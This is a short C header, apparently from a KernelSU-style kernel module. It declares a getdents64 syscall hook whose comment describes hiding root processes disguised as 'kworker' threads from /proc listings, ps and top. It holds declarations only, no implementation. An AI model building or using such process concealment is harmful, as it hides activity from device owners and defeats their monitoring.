#ifndef __KSU_H_PROC_HIDE
#define __KSU_H_PROC_HIDE

#include <asm/ptrace.h>

struct pt_regs;

/*
 * 进程级隐身（内核态）。
 *
 * 用户态只能改 argv[0] / comm，脚本派生出来的进程改不了；要连 /proc 目录项一起藏，
 * 只能在 syscall 层过滤。
 *
 * 这里 hook getdents64：调用原 syscall 之后，把「我们自己启动的进程」的 dirent 从
 * 返回缓冲区里摘掉。ps / top / 各种进程管理器读 /proc 都是走这条路径，所以它们
 * 看不到这些 pid（而 /proc/<pid>/xxx 直接访问不受影响，避免把系统其他部分弄坏）。
 *
 * 判定条件收得很窄，绝不误伤真实内核线程：
 *   · 目录项是目录且名字是纯数字（pid）
 *   · 该 task 存在且不是内核线程（PF_KTHREAD）
 *   · 真实 uid == 0
 *   · comm 以 "kworker" 开头（mtkd 用伪装名启动的那些）
 */
long __nocfi ksu_hook_getdents64(const struct pt_regs *regs);

void ksu_proc_hide_init(void);
void ksu_proc_hide_exit(void);

#endif